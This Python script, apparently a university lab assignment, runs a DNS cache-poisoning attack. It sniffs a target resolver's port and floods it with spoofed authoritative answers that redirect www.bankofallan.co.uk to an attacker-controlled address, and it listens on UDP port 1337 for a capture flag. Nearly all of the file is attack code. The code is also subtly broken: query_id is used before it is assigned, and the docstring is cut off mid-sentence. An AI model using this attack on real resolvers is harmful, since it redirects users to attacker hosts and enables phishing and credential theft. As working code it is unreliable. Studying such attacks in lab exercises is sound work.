#! /usr/bin/env python3
# -*- coding: utf-8 -*-
"""Venom DNS server attacker

This script makes

"""
__author__ = "Andrea Lacava (1663286), Matteo Attenni (1655314), Ilaria Clemente (1836039)"
__credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
__license__ = "GPL"
__version__ = "1.0"
__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.1655314@studenti.uniroma1.it, " \
            "clemente.1836039@studenti.uniroma1.it"
__status__ = "Production"

import sys
import threading
import time

from socket import *
from random import *

from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff

# print headers just for debug and info
DNS_ROUTINE_HEADER = "DNS_SERVER_ROUTINE: "
BITE_THE_RAT_HEADER = "BITE_THE_RAT: "
LISTENER_HEADER = "LISTENER_FLAG: "

TARGET_IP = "192.168.56.101"  # vulnDNS's IP
TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request

BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)

SPOOFED_DNS = "10.0.0.1"
URL_TO_POISON = "bankofallan.co.uk"
DNS_URL_BADGUY = "badguy.ru"

PACKET_SIZE = 1000  # number of packets


def random_query_id(start_value):
    start_value+=randint(1,1000000)
    return start_value


def dns_server_routine():
    print(DNS_ROUTINE_HEADER + "Starting routine of DNS sniffer of badguy.ru")
    while True:
        a = sniff(filter="port " + str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
        if a[0].haslayer(IP):
            print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing..")
            sniffed_packet = a[0]
            sniffed_ip = sniffed_packet.getlayer(IP)
            target_port = sniffed_ip.sport
            print(DNS_ROUTINE_HEADER +
                  "\nSniffed ip src " + str(sniffed_ip.src) + ", src port: " + str(sniffed_ip.sport) + "\nDst ip:" +
                  str(sniffed_ip.dst) + ", dest port:" +
                  str(sniffed_ip.dport) + "\nTarget port response (source port) is " +
                  str(target_port) + "\n")

            bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=[target_port])
            print(DNS_ROUTINE_HEADER + "Bite the rat!")
            bite_rat_thread.start()
            bite_rat_thread.join()
            break


def randomize_url(seed):
    # current_milli_time()
    return chr((seed % 256) + 15) + "."


def bite_the_rat(target_port_sniffed):
    """
    Attack function.


    """

    random_url = "www." + URL_TO_POISON
    dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=random_url))
    send(dns_req, verbose=0)
    for i in range(PACKET_SIZE):
        # since we've to guess the query id we define a time-based pseudo random generator
        query_id = random_query_id(query_id) % 65536  # 16 bit maximum delimiter of query_id's DNS field
        res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=query_id,
                                                                                               qr=1,
                                                                                               aa=1,
                                                                                               ra=0,
                                                                                               rcode=0,
                                                                                               qd=DNSQR(
                                                                                                   qname=random_url,
                                                                                                   qtype="A"),
                                                                                               an=(DNSRR(
                                                                                                   rrname=random_url + ".",
                                                                                                   type="A", ttl=60000,
                                                                                                   rdata='192.168.56.1'))
                                                                                               )

        print(BITE_THE_RAT_HEADER + "Response number " + str(i) + ", queryid: " + str(
            query_id) + ", random_url= \"" + random_url + "\" ")
        send(res_packet, verbose=0)

    print("Attack terminated exiting")

    # DNSRR(rrname='ns.bankofallan.com', type="A", ttl=60000, rdata='192.168.56.1')


UDP_IP = "192.168.56.1"
UDP_PORT = 1337
BUFFER_SIZE = 2048


def flag_victory_listener():
    """
    This function listens on port 1337 the Victory flag.

    """
    sock = socket(AF_INET,  # Internet
                  SOCK_DGRAM)  # UDP
    print(LISTENER_HEADER + "Starting server...")
    sock.bind((UDP_IP, UDP_PORT))
    print(LISTENER_HEADER + "done!")
    try:
        while True:
            data, addr = sock.recvfrom(BUFFER_SIZE)
            print(LISTENER_HEADER + "Received from \"" + addr[0] + "\": " + str(data))
    except KeyboardInterrupt:
        print(LISTENER_HEADER + "Closing socket to exit gracefully...")
        sock.close()
        print(LISTENER_HEADER + "Socket close, bye bye!")
        sys.exit(0)


TIME_SLEEP_SECONDS = 5  # 5 seconds delay


def main():
    print("Initializing attack...")
    dns_badguy_thread = threading.Thread(name="dns_badguy_thread", target=dns_server_routine)
    flag_victory_thread = threading.Thread(name="flag_victory_thread", target=flag_victory_listener)
    print("Threads created!")
    print("Starting DNS of badguy to get port and initial query id")
    dns_badguy_thread.start()
    print("Starting listener to get victory flag")
    flag_victory_thread.start()

    print("Sleeping for 5 seconds to allow DNS sniff startup")
    time.sleep(TIME_SLEEP_SECONDS)

    # point 1: send a dns request for badguy.ru
    print("Sending first request to " + TARGET_IP +
          " asking for badguy.ru to get an initial queryId and port with our DNS")
    # rd = 1, recursion desired
    first_dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=DNS_URL_BADGUY))

    send(first_dns_req, verbose=0)

    flag_victory_thread.join()
    dns_badguy_thread.join()


if __name__ == "__main__":
    main()
